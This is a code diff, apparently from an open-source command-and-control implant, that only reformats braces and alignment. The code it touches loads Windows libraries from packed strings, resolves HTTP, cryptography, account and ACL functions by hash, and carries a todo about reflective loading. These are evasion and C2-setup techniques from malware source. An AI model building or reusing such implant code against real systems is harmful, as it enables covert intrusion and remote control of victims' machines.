@@ -43,8 +43,7 @@ namespace Implant {
                 if (Ctx->Session.Retry == 3) {
                     break;
                 }
-            }
-            else {
+            } else {
                 Ctx->Session.Retry = 0;
             }
         }
@@ -70,10 +69,10 @@ namespace Implant {
         // todo: add reflective loading? maybe https://github.com/bats3c/DarkLoadLibrary
         if ((FPTR(Ctx->win32.LoadLibraryA, Ctx->Modules.kernel32, LOADLIBRARYA))) {
             if (
-                !(Ctx->Modules.crypt32 = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr))) ||
-                !(Ctx->Modules.winhttp = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr))) ||
-                !(Ctx->Modules.advapi = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr))) ||
-                !(Ctx->Modules.iphl = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr)))) {
+                !(Ctx->Modules.crypt32  = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr))) ||
+                !(Ctx->Modules.winhttp  = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr))) ||
+                !(Ctx->Modules.advapi   = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr))) ||
+                !(Ctx->Modules.iphl     = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr)))) {
                 return_defer(ERROR_MOD_NOT_FOUND);
             }
         }
@@ -82,33 +81,33 @@ namespace Implant {
         }
 
         if (
-            !(FPTR(Ctx->win32.WinHttpOpen, Ctx->Modules.winhttp, WINHTTPOPEN)) ||
-            !(FPTR(Ctx->win32.WinHttpConnect, Ctx->Modules.winhttp, WINHTTPCONNECT)) ||
-            !(FPTR(Ctx->win32.WinHttpOpenRequest, Ctx->Modules.winhttp, WINHTTPOPENREQUEST)) ||
-            !(FPTR(Ctx->win32.WinHttpAddRequestHeaders, Ctx->Modules.winhttp, WINHTTPADDREQUESTHEADERS)) ||
-            !(FPTR(Ctx->win32.WinHttpSetOption, Ctx->Modules.winhttp, WINHTTPSETOPTION)) ||
-            !(FPTR(Ctx->win32.WinHttpGetProxyForUrl, Ctx->Modules.winhttp, WINHTTPGETPROXYFORURL)) ||
+            !(FPTR(Ctx->win32.WinHttpOpen,                  Ctx->Modules.winhttp, WINHTTPOPEN)) ||
+            !(FPTR(Ctx->win32.WinHttpConnect,               Ctx->Modules.winhttp, WINHTTPCONNECT)) ||
+            !(FPTR(Ctx->win32.WinHttpOpenRequest,           Ctx->Modules.winhttp, WINHTTPOPENREQUEST)) ||
+            !(FPTR(Ctx->win32.WinHttpAddRequestHeaders,     Ctx->Modules.winhttp, WINHTTPADDREQUESTHEADERS)) ||
+            !(FPTR(Ctx->win32.WinHttpSetOption,             Ctx->Modules.winhttp, WINHTTPSETOPTION)) ||
+            !(FPTR(Ctx->win32.WinHttpGetProxyForUrl,        Ctx->Modules.winhttp, WINHTTPGETPROXYFORURL)) ||
             !(FPTR(Ctx->win32.WinHttpGetIEProxyConfigForCurrentUser, Ctx->Modules.winhttp, WINHTTPGETIEPROXYCONFIGFORCURRENTUSER)) ||
-            !(FPTR(Ctx->win32.WinHttpSendRequest, Ctx->Modules.winhttp, WINHTTPSENDREQUEST)) ||
-            !(FPTR(Ctx->win32.WinHttpReceiveResponse, Ctx->Modules.winhttp, WINHTTPRECEIVERESPONSE)) ||
-            !(FPTR(Ctx->win32.WinHttpReadData, Ctx->Modules.winhttp, WINHTTPREADDATA)) ||
-            !(FPTR(Ctx->win32.WinHttpQueryHeaders, Ctx->Modules.winhttp, WINHTTPQUERYHEADERS)) ||
-            !(FPTR(Ctx->win32.WinHttpQueryDataAvailable, Ctx->Modules.winhttp, WINHTTPQUERYDATAAVAILABLE)) ||
-            !(FPTR(Ctx->win32.WinHttpCloseHandle, Ctx->Modules.winhttp, WINHTTPCLOSEHANDLE)) ||
-            !(FPTR(Ctx->win32.GetAdaptersInfo, Ctx->Modules.iphl, GETADAPTERSINFO)) ||
-            !(FPTR(Ctx->win32.CryptStringToBinaryA, Ctx->Modules.crypt32, CRYPTSTRINGTOBINARYA)) ||
-            !(FPTR(Ctx->win32.CryptBinaryToStringA, Ctx->Modules.crypt32, CRYPTBINARYTOSTRINGA)) ||
-            !(FPTR(Ctx->win32.GetUserNameA, Ctx->Modules.advapi, GETUSERNAMEA)) ||
-            !(FPTR(Ctx->win32.LookupAccountSidW, Ctx->Modules.advapi, LOOKUPACCOUNTSIDW)) ||
-            !(FPTR(Ctx->win32.LookupPrivilegeValueA, Ctx->Modules.advapi, LOOKUPPRIVILEGEVALUEA)) ||
-            !(FPTR(Ctx->win32.SetEntriesInAclA, Ctx->Modules.advapi, SETENTRIESINACLA)) ||
-            !(FPTR(Ctx->win32.AllocateAndInitializeSid, Ctx->Modules.advapi, ALLOCATEANDINITIALIZESID)) ||
-            !(FPTR(Ctx->win32.AddMandatoryAce, Ctx->Modules.advapi, ADDMANDATORYACE)) ||
+            !(FPTR(Ctx->win32.WinHttpSendRequest,           Ctx->Modules.winhttp, WINHTTPSENDREQUEST)) ||
+            !(FPTR(Ctx->win32.WinHttpReceiveResponse,       Ctx->Modules.winhttp, WINHTTPRECEIVERESPONSE)) ||
+            !(FPTR(Ctx->win32.WinHttpReadData,              Ctx->Modules.winhttp, WINHTTPREADDATA)) ||
+            !(FPTR(Ctx->win32.WinHttpQueryHeaders,          Ctx->Modules.winhttp, WINHTTPQUERYHEADERS)) ||
+            !(FPTR(Ctx->win32.WinHttpQueryDataAvailable,    Ctx->Modules.winhttp, WINHTTPQUERYDATAAVAILABLE)) ||
+            !(FPTR(Ctx->win32.WinHttpCloseHandle,           Ctx->Modules.winhttp, WINHTTPCLOSEHANDLE)) ||
+            !(FPTR(Ctx->win32.GetAdaptersInfo,              Ctx->Modules.iphl, GETADAPTERSINFO)) ||
+            !(FPTR(Ctx->win32.CryptStringToBinaryA,         Ctx->Modules.crypt32, CRYPTSTRINGTOBINARYA)) ||
+            !(FPTR(Ctx->win32.CryptBinaryToStringA,         Ctx->Modules.crypt32, CRYPTBINARYTOSTRINGA)) ||
+            !(FPTR(Ctx->win32.GetUserNameA,                 Ctx->Modules.advapi, GETUSERNAMEA)) ||
+            !(FPTR(Ctx->win32.LookupAccountSidW,            Ctx->Modules.advapi, LOOKUPACCOUNTSIDW)) ||
+            !(FPTR(Ctx->win32.LookupPrivilegeValueA,        Ctx->Modules.advapi, LOOKUPPRIVILEGEVALUEA)) ||
+            !(FPTR(Ctx->win32.SetEntriesInAclA,             Ctx->Modules.advapi, SETENTRIESINACLA)) ||
+            !(FPTR(Ctx->win32.AllocateAndInitializeSid,     Ctx->Modules.advapi, ALLOCATEANDINITIALIZESID)) ||
+            !(FPTR(Ctx->win32.AddMandatoryAce,              Ctx->Modules.advapi, ADDMANDATORYACE)) ||
             !(FPTR(Ctx->win32.InitializeSecurityDescriptor, Ctx->Modules.advapi, INITIALIZESECURITYDESCRIPTOR)) ||
-            !(FPTR(Ctx->win32.InitializeAcl, Ctx->Modules.advapi, INITIALIZEACL)) ||
-            !(FPTR(Ctx->win32.SetSecurityDescriptorDacl, Ctx->Modules.advapi, SETSECURITYDESCRIPTORDACL)) ||
-            !(FPTR(Ctx->win32.SetSecurityDescriptorSacl, Ctx->Modules.advapi, SETSECURITYDESCRIPTORSACL)) ||
-            !(FPTR(Ctx->win32.FreeSid, Ctx->Modules.advapi, FREESID))) {
+            !(FPTR(Ctx->win32.InitializeAcl,                Ctx->Modules.advapi, INITIALIZEACL)) ||
+            !(FPTR(Ctx->win32.SetSecurityDescriptorDacl,    Ctx->Modules.advapi, SETSECURITYDESCRIPTORDACL)) ||
+            !(FPTR(Ctx->win32.SetSecurityDescriptorSacl,    Ctx->Modules.advapi, SETSECURITYDESCRIPTORSACL)) ||
+            !(FPTR(Ctx->win32.FreeSid,                      Ctx->Modules.advapi, FREESID))) {
             return_defer(ERROR_PROC_NOT_FOUND);
         }
 
